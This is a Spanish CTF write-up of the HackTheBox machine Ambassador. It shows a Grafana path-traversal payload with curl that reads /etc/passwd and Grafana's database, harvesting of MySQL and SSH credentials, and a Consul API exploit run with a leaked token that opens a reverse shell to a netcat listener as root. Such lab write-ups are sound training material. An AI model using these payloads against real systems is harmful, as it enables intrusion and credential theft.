---
layout: single
title: Ambassador HTB - WriteUp
excerpt: WriteUp de la máquina Ambassador de HTB.
date: 2023-03-01
classes: wide
header:
  teaser: /assets/images/Ambassador/Ambassador.png
  teaser_home_page: true
  icon: /assets/images/Ambassador/Ambassador.png
categories:
  - infosec
tags:
  - ctf
  - Linux                                                                                                                                                                                 
  - Writeup
  - Grafana                                                                                                                                                                                  
  - Direcctory-Traversal                                                                                                                                                                                    
  - Consul-Exploit
  - MySQL
  - SQLITE3
---

En el día de hoy estaremos resolviendo la máquina Ambassador de HackTheBox. Es una máquina Linux y su dirección IP es 10.10.11.183.

### Índice

1. [Enumeración Inicial](#enumeración-inicial)
2. [Directory Traversal and Arbitrary File Read](#directory-traversal-and-arbitrary-file-read)
3. [Database Enumeration](#database-enumeration)
4. [Privesc](#privesc)

### Enumeración Inicial

Lo primero que haremos será una enumeración de los servicios expuestos que tiene la máquina. Para esa tarea usaremos nmap.

```bash
# Nmap 7.91 scan initiated Wed Mar  1 19:35:43 2023 as: nmap -sC -sV -Pn -oN Extraction -p22,80,3000,3306 10.10.11.183
Nmap scan report for 10.10.11.183
Host is up (0.065s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)
|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)
|_  256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Hugo 0.94.2
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Ambassador Development Server
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Wed, 01 Mar 2023 18:36:24 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Wed, 01 Mar 2023 18:35:51 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Wed, 01 Mar 2023 18:35:56 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 10
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolNew, LongPassword, Support41Auth, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, SupportsTransactions, InteractiveClient, LongColumnFlag, IgnoreSigpipes, ConnectWithDatabase, SwitchToSSLAfterHandshake, FoundRows, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsLoadDataLocal, SupportsCompression, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar  1 19:37:44 2023 -- 1 IP address (1 host up) scanned in 120.55 seconds
```

Tiene abiero el puerto SSH (22), dos servicios HTTP (80,3000) y el MySQL(3306) expuestos. Si entramos en el puerto 80 podemos encontrar una página que nos proporciona información sobre el iniciar sesión por SSH. Explican que para conectarse a la máquina hay que usar el usuario "developer" y que la contraseña nos la dará el equipo de DevOps. El puerto 80 no tiene nada mas...

El puerto  3000 tiene un grafana de versión v8.2.0. Podemos verla directamente en la página o desde curl.

```bash
❯ curl  -s "http://10.10.11.183:3000/login" | grep "v8"
          navTree: [{"id":"dashboards","text":"Dashboards","subTitle":"Manage dashboards and folders","icon":"apps","url":"/","sortWeight":-1900,"children":[{"id":"home","text":"Home","icon":"home-alt","url":"/","hideFromTabs":true},{"id":"divider","text":"Divider","divider":true,"hideFromTabs":true},{"id":"manage-dashboards","text":"Manage","icon":"sitemap","url":"/dashboards"},{"id":"playlists","text":"Playlists","icon":"presentation-play","url":"/playlists"}]},{"id":"alerting","text":"Alerting","subTitle":"Alert rules and notifications","icon":"bell","url":"/alerting/list","sortWeight":-1600,"children":[{"id":"alert-list","text":"Alert rules","icon":"list-ul","url":"/alerting/list"}]},{"id":"help","text":"Help","subTitle":"Grafana v8.2.0 (d7f71e9eae)","icon":"question-circle","url":"#","sortWeight":-1200,"hideFromMenu":true}],
```

### Directory Traversal and Arbitrary File Read

Si hacemos la búsqueda de la versión en google podemos ver que es vulnerable a  Directory Traversal and Arbitrary File Read. Podemos explotarlo con curl.

```bash
❯ curl "http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd" --path-as-is
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false
```

Sabiendo esto, debemos tener en cuenta que grafana tiene varios archivos interesantes:

- grafana.db -> base de datos sqlite de configuración de  grafana.
- grafana.ini -> Archivo de configuración de grafana.


Nos vamos a bajar esos archivos. La ruta de los archivos de configuración suele ser /etc/grafana y la del archivo db suele ser "/var/lib/grafana/grafana.db".

```bash
❯ curl -s  "http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/grafana.ini" --path-as-is --output grafana.ini

❯ curl -s  "http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db" --path-as-is --output grafana.db
```


El archivo grafana.ini no tiene nada interesante, vamos a enumerar el archivo de sqlite3. Podemos ver varias tablas.

```bash
sqlite\> .tables
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              ngalert_configuration     
alert_notification          org                       
alert_notification_state    org_user                  
alert_rule                  playlist                  
alert_rule_tag              playlist_item             
alert_rule_version          plugin_setting            
annotation                  preferences               
annotation_tag              quota                     
api_key                     server_lock               
cache_data                  session                   
dashboard                   short_url                 
dashboard_acl               star                      
dashboard_provisioning      tag                       
dashboard_snapshot          team                      
dashboard_tag               team_member               
dashboard_version           temp_user                 
data_source                 test_data                 
kv_store                    user                      
library_element             user_auth                 
library_element_connection  user_auth_token 
```

No podemos romper la contraseña del usuario Administrador, pero si miramos la tabla "data_source" tiene la siguiente información.

```bash
sqlite> select * from data_source;
2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-03-01 18:31:18|0|{}|1|uKewFgM4z
```

### Database Enumeration

Parece los datos de conexión a una base de datos mysql, podemos probar dado que el puerto esta abierto.

```mysql
❯ mysql -u grafana -p'dontStandSoCloseToMe63221!' -h 10.10.11.183 -P 3306
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 17
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]\>
```

Nos hemos podido conectar! Vamos a listar las bases de datos:

```mysql
MySQL [(none)]\> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.098 sec)
```

Voy a enumerar whackywidget, primero listaré las tablas de esa base de datos (usa la base de datos primero)

```mysql
MySQL [(none)]\> use whackywidget
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]\> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
```

Vamos a ver el contenido de la tabla:

```mysql
MySQL [whackywidget]\> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
```

Eso parece base64, vamos a decodearlo.

```bash
❯ echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
anEnglishManInNewYork027468
```

### Privesc

¿Será esa la contraseña del usuario developer? Vamos a probar a conectarnos por SSH.

```bash
❯ ssh developer@10.10.11.183
developer@10.10.11.183's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 01 Mar 2023 07:02:30 PM UTC

  System load:           0.04
  Usage of /:            80.9% of 5.07GB
  Memory usage:          38%
  Swap usage:            0%
  Processes:             227
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.183
  IPv6 address for eth0: dead:beef::250:56ff:feb9:256c

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Sep  2 02:33:30 2022 from 10.10.0.1
developer@ambassador:~$ 
```

Ya tenemos conexión remota con la máquina. Ahora toca escalar privilegios.  En /opt podemos ver dos directorios. 

```bash
developer@ambassador:/opt$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Sep  1 22:13 .
drwxr-xr-x 20 root   root   4096 Sep 15 17:24 ..
drwxr-xr-x  4 consul consul 4096 Mar 13  2022 consul
drwxrwxr-x  5 root   root   4096 Mar 13  2022 my-app
```

Tenemos un "HashiCorp Consul" y una aplicación desarrollada propia. La versión de consul es la siguiente:

```bash
developer@ambassador:/opt/consul$ consul version
Consul v1.13.2
Revision 0e046bbb
Build Date 2022-09-20T20:30:07Z
Protocol 2 spoken by default, understands 2 to 3 (agent will automatically use protocol >2 when speaking to compatible agents)
```

Veo que hay un exploit disponible que se aprovecha de la API. Pero nos hace falta un token que no tenemos :( pasamos a enumerar el otro directorio. Veo que hay un .git en el directorio.

```bash
developer@ambassador:/opt/my-app$ ls -la
total 24
drwxrwxr-x 5 root root 4096 Mar 13  2022 .
drwxr-xr-x 4 root root 4096 Sep  1 22:13 ..
drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
drwxrwxr-x 4 root root 4096 Mar 13  2022 env
drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
```

Vamos a enumerar los commits con git.

```bash
developer@ambassador:/opt/my-app$ git log --oneline
33a53ef (HEAD -> main) tidy config script
c982db8 config script
8dce657 created project with django CLI
4b8597b .gitignore
```

El commit de config script me llama la atención. Vamos a mostrarlo con git show.

```bash
developer@ambassador:/opt/my-app$ git show c982db8
commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
new file mode 100755
index 0000000..35c08f6
--- /dev/null
+++ b/whackywidget/put-config-in-consul.sh
@@ -0,0 +1,4 @@
+# We use Consul for application config in production, this script will help set the correct values for the app
+# Export MYSQL_PASSWORD before running
+
+consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

Vemos un token que usa para consul, perfecto! Vamos a poner a prueba el exploit que encontré anteriormente. https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API

```bash
developer@ambassador:/tmp$ python3 exploit.py --rhost 127.0.0.1 --rport 8500 --lhost 10.10.16.6 --lport 443 --token bb03b43b-1d81-d62b-24b5-39540ee469b5

[+] Request sent successfully, check your listener

developer@ambassador:/tmp$ 
- 
❯ nc -lvvp 443
listening on [any] 443 ...
10.10.11.183: inverse host lookup failed: Unknown host
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.183] 58748
bash: cannot set terminal process group (1929): Inappropriate ioctl for device
bash: no job control in this shell
root@ambassador:/# 
```

Hemos ganado acceso como root! Espero que te haya servido!


